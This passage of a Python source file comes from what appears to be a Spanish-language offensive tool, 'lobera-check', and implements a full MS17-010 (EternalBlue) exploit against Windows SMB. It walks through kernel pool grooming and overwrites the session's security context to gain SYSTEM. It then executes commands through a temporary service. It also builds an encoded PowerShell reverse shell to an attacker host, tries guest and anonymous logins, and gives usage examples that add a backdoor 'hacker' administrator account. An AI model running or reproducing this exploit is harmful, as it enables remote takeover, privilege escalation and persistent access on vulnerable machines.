            resp2 = scmr.hROpenServiceW(rpc, sc_handle, svc_name + '\x00')
            scmr.hRDeleteService(rpc, resp2['lpServiceHandle'])
            scmr.hRCloseServiceHandle(rpc, resp2['lpServiceHandle'])
        except Exception:
            pass

        resp3 = scmr.hRCreateServiceW(rpc, sc_handle,
                                       svc_name + '\x00', svc_name + '\x00',
                                       lpBinaryPathName=cmd + '\x00')
        svc_handle = resp3['lpServiceHandle']
        try:
            scmr.hRStartServiceW(rpc, svc_handle)
        except Exception:
            pass
    finally:
        try:
            if svc_handle:
                scmr.hRDeleteService(rpc, svc_handle)
                scmr.hRCloseServiceHandle(rpc, svc_handle)
        except Exception:
            pass
        try:
            if sc_handle:
                scmr.hRCloseServiceHandle(rpc, sc_handle)
        except Exception:
            pass
        try:
            rpc.disconnect()
        except Exception:
            pass


def _eternalblue_exploit(target, port, cmd, timeout=60, user='', password='', domain=''):
    """
    Exploit completo de EternalBlue portado a Python 3.

    Flujo:
      1. Detecta OS y arquitectura via SMB
      2. Busca un named pipe accesible (browser, spoolss, netlogon, lsarpc, samr)
      3. Pool grooming (matched_pairs para Win7+/Win8+)
      4. Arbitrary read/write en memoria de kernel
      5. Eleva la sesión SMB a SYSTEM modificando el SecurityContext
      6. Ejecuta el comando via SCM con privilegios SYSTEM

    Soporta: Windows 7, 8, 10, Server 2008 R2, 2012, 2012 R2, 2016.
    """
    try:
        MYSMB = _build_mysmb_class()
    except ImportError:
        console.print("  [red]Falta impacket[/red]")
        return False

    from impacket import smb as impacket_smb

    console.print(f"  [dim]Conectando a {target}:{port}...[/dim]")
    try:
        conn = MYSMB(target, int(port), timeout=timeout)
        conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception as e:
        console.print(f"  [red]✗ No se pudo conectar: {e}[/red]")
        return False

    # Capturar OS antes del login (viene en la negociación SMB)
    server_os = conn.get_server_os()

    # Intentar login nulo. Si falla, parchear el UID a 0xFFFF (valor que impacket
    # usa internamente para sesiones nulas en SMB1 sin extended security).
    # login() con usuario/password vacíos hace NULL SESSION (SMB1).
    # Intentar primero login_standard (sin extended security NTLMSSP),
    # luego login() genérico. Si ambos fallan, continuar igualmente:
    # el exploit EternalBlue puede funcionar incluso sin SESSION_SETUP
    # completado porque opera a nivel de paquetes SMB raw.
    # Intentar credenciales en orden: las indicadas, luego fallbacks comunes.
    # En 2012 R2 la null session pura falla pero guest/''/anonymous suelen funcionar.
    login_ok = False
    cred_candidates = [(user, password, domain)] if (user or password) else []
    cred_candidates += [
        ('', '', ''),
        ('guest', '', ''),
        ('anonymous', '', ''),
    ]
    login_who = ''
    for u, p, d in cred_candidates:
        try:
            conn.login_standard(u, p, domain=d)
            login_ok = True
            login_who = f"{d}\\{u}" if d else (u or "null session")
            break
        except Exception:
            pass
        try:
            conn.login(u, p, domain=d)
            login_ok = True
            login_who = f"{d}\\{u}" if d else (u or "null session")
            break
        except Exception:
            pass

    if login_ok:
        console.print(f"  [dim]Login OK: {login_who}[/dim]")
    else:
        console.print("  [dim]Login rechazado — continuando con sesión anónima raw[/dim]")
    console.print(f"  [dim]SO detectado: {server_os}[/dim]")

    info = {}
    if server_os.startswith(("Windows 7 ", "Windows Server 2008 R2")):
        info['os'] = 'WIN7'
        info['method'] = _exploit_matched_pairs
    elif server_os.startswith(("Windows 8", "Windows Server 2012 ", "Windows Server 2016 ",
                                "Windows 10", "Windows RT 9200")):
        info['os'] = 'WIN8'
        info['method'] = _exploit_matched_pairs
    elif server_os.startswith(("Windows Server (R) 2008", "Windows Vista")):
        info['os'] = 'WIN7'
        info['method'] = _exploit_matched_pairs
    elif server_os.startswith("Windows Server 2003 "):
        info['os'] = 'WIN2K3'
        info['method'] = None  # fish_barrel no portado aún
    elif server_os.startswith(("Windows 5.1", "Windows XP ")):
        info['os'] = 'WINXP'
        info['arch'] = 'x86'
        info['method'] = None
    else:
        console.print(f"  [yellow]⚠  OS no reconocido — intentando con perfil WIN8[/yellow]")
        info['os'] = 'WIN8'
        info['method'] = _exploit_matched_pairs

    if info['method'] is None:
        console.print(f"  [red]✗ Este OS ({server_os}) requiere el método fish_barrel — no implementado aún[/red]")
        conn.get_socket().close()
        return False

    console.print(f"  [dim]Buscando named pipe accesible...[/dim]")
    pipe_name = _find_named_pipe(conn)
    if pipe_name is None:
        console.print("  [red]✗ No se encontró ningún named pipe accesible[/red]")
        console.print("  [dim]Pipes probados: browser, spoolss, netlogon, lsarpc, samr[/dim]")
        conn.get_socket().close()
        return False

    console.print(f"  [dim]Usando pipe: {pipe_name}[/dim]")

    console.print("  [dim]Iniciando pool grooming...[/dim]")
    # El grooming envía/recibe muchos paquetes; subir el timeout del socket
    # para que ningún recv individual expire durante la operación.
    try:
        conn.get_socket().settimeout(300)
    except Exception:
        pass
    try:
        ok = info['method'](conn, pipe_name, info)
    except Exception as e:
        console.print(f"  [red]✗ Error en pool grooming: {e}[/red]")
        conn.get_socket().close()
        return False

    if not ok:
        console.print("  [red]✗ Pool grooming fallido — alineación incorrecta, intenta de nuevo[/red]")
        conn.get_socket().close()
        return False

    console.print("  [dim]Elevando sesión a SYSTEM...[/dim]")
    fmt = info['PTR_FMT']
    try:
        _write_data(conn, info, info['session'] + info['SESSION_ISNULL_OFFSET'], b'\x00\x01')
        sessionData = _read_data(conn, info, info['session'], 0x100)
        secCtxAddr = unpack_from('<' + fmt, sessionData, info['SESSION_SECCTX_OFFSET'])[0]

        secCtxData = _read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])
        _write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])
    except Exception as e:
        console.print(f"  [red]✗ Error elevando sesión: {e}[/red]")
        conn.get_socket().close()
        return False

    console.print(f"  [bold green]✓ Sesión elevada a SYSTEM[/bold green]")
    console.print(f"  [bold green]Ejecutando: {cmd}[/bold green]")

    try:
        _service_exec(conn, cmd)
        console.print("  [bold green]✓ Comando enviado como NT AUTHORITY\\SYSTEM[/bold green]")
        ok = True
    except Exception as e:
        console.print(f"  [red]✗ Error ejecutando comando: {e}[/red]")
        ok = False
    finally:
        # Restaurar SecurityContext original
        try:
            _write_data(conn, info, secCtxAddr, secCtxData)
        except Exception:
            pass
        try:
            conn.disconnect_tree(conn.get_tid())
            conn.logoff()
            conn.get_socket().close()
        except Exception:
            pass

    return ok


# ──────────────────────────────────────────────────────────────────────────────
# Modos CLI
# ──────────────────────────────────────────────────────────────────────────────

def run_check(target, port, timeout):
    console.print(f"\n  [bold cyan]MS17-010 — EternalBlue checker[/bold cyan]")
    console.print(f"  [dim]Objetivo: {target}:{port}[/dim]\n")
    result = check_ms17010(target, port, timeout)

    if result is True:
        console.print(f"  [bold red]✗ VULNERABLE[/bold red] — MS17-010 (EternalBlue) sin parchear")
        console.print(f"  [dim]STATUS_INSUFF_SERVER_RESOURCES confirmado[/dim]")
        console.print(f"\n  [yellow]Siguiente paso:[/yellow]")
        console.print(f"    [cyan]lobera-check ms17010 exploit -t {target} --payload cmd --cmd \"whoami\"[/cyan]")
    elif result is False:
        console.print(f"  [bold green]✓ NO vulnerable[/bold green] — MS17-010 parcheado o SMBv1 desactivado")
    else:
        console.print(f"  [yellow]? No se pudo determinar[/yellow] — sin respuesta o puerto cerrado")
        console.print(f"  [dim]Comprueba que el puerto {port} esté abierto y SMBv1 activo[/dim]")


def run_exploit(target, port, payload, cmd, lhost, lport, timeout, user='', password='', domain=''):
    console.print(f"\n  [bold red]MS17-010 — EternalBlue exploit[/bold red]")
    console.print(f"  [dim]Objetivo: {target}:{port}[/dim]")
    console.print(f"  [dim]Payload: {payload}[/dim]\n")

    # Verificar primero
    console.print("  [dim]Verificando vulnerabilidad...[/dim]")
    vuln = check_ms17010(target, port, timeout=15)
    if vuln is None:
        console.print(f"  [red]✗ No se pudo conectar a {target}:{port}[/red]")
        return
    elif vuln is False:
        console.print(f"  [red]✗ Objetivo no vulnerable a MS17-010[/red]")
        return
    console.print("  [bold green]✓ Vulnerable confirmado[/bold green]")

    if payload == "cmd":
        if not cmd:
            console.print("  [red]✗ --cmd requerido para payload 'cmd'[/red]")
            return
        console.print(f"  [dim]Comando: {cmd}[/dim]\n")
        _eternalblue_exploit(target, port, cmd, timeout, user=user, password=password, domain=domain)

    elif payload == "shell":
        if not lhost or not lport:
            console.print("  [red]✗ --lhost y --lport requeridos para payload 'shell'[/red]")
            return
        console.print(f"  [dim]Reverse shell → {lhost}:{lport}[/dim]\n")
        ps_enc = _build_ps_reverse_shell(lhost, int(lport))
        ps_cmd = f"cmd /c powershell -nop -w hidden -enc {ps_enc}"
        _eternalblue_exploit(target, port, ps_cmd, timeout, user=user, password=password, domain=domain)

    else:
        console.print(f"  [red]✗ Payload desconocido: {payload}[/red]")
        console.print(f"  [dim]Disponibles: cmd, shell[/dim]")


def _build_ps_reverse_shell(lhost: str, lport: int) -> str:
    import base64
    ps_script = (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();"
        f"[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);"
        f"$sb=$r+'PS '+(pwd).Path+'> ';"
        f"$se=([text.encoding]::ASCII).GetBytes($sb);"
        f"$s.Write($se,0,$se.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    return base64.b64encode(ps_script.encode('utf-16-le')).decode()


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def build_parser():
    import argparse
    parser = argparse.ArgumentParser(
        prog="lobera-check",
        description="Comprobación y explotación de vulnerabilidades en entornos Windows/AD",
    )
    subs = parser.add_subparsers(dest="vuln", metavar="vulnerabilidad")

    p = subs.add_parser("ms17010", help="EternalBlue (CVE-2017-0144) — checker y exploit")
    p.add_argument("modo", choices=["check", "exploit"])
    p.add_argument("-t", "--target", required=True)
    p.add_argument("--port", default=445, type=int)
    p.add_argument("--timeout", default=60, type=int)
    p.add_argument("--payload", choices=["cmd", "shell"], default="cmd")
    p.add_argument("--cmd", default=None)
    p.add_argument("--lhost", default=None)
    p.add_argument("--lport", default=4444, type=int)
    p.add_argument("-u", "--user",     default="", help="Usuario SMB (vacío = sesión nula)")
    p.add_argument("-p", "--password", default="", help="Contraseña SMB")
    p.add_argument("-d", "--domain",   default="", help="Dominio")
    return parser


def _banner():
    from tools.common import banner, tabla_modos, tabla_flags, ejemplos
    banner("lobera-check  —  Checker y exploit de vulnerabilidades Windows/AD")
    tabla_modos([
        ("ms17010 check",   "Detecta si el objetivo es vulnerable a EternalBlue (CVE-2017-0144)"),
        ("ms17010 exploit", "Explota MS17-010 con el kernel exploit real — sin credenciales"),
    ], titulo="Vulnerabilidades")
    tabla_flags([
        ("-t / --target",  "str",  "IP o hostname del objetivo"),
        ("--port",         "int",  "Puerto SMB (default: 445)"),
        ("--timeout",      "int",  "Timeout en segundos (default: 60)"),
        ("--payload",      "str",  "Tipo de payload: cmd o shell"),
        ("--cmd",          "str",  "Comando a ejecutar cuando --payload cmd"),
        ("--lhost",        "str",  "IP local para reverse shell"),
        ("--lport",        "int",  "Puerto local para reverse shell (default: 4444)"),
    ], titulo="Opciones")
    ejemplos([
        "lobera-check ms17010 check -t 192.168.1.10",
        "lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd \"net user hacker P@ss1234 /add && net localgroup administrators hacker /add\"",
        "lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444",
    ])


def main():
    parser = build_parser()
    args = parser.parse_args()

    if not args.vuln:
        _banner()
        parser.print_help()
        return

    if args.vuln == "ms17010":
        if args.modo == "exploit":
            _banner()
        if args.modo == "check":
            run_check(args.target, args.port, args.timeout)
        else:
            run_exploit(args.target, args.port,
                        args.payload, args.cmd,
                        args.lhost, args.lport,
                        args.timeout,
                        user=args.user, password=args.password, domain=args.domain)


if __name__ == "__main__":
    main()
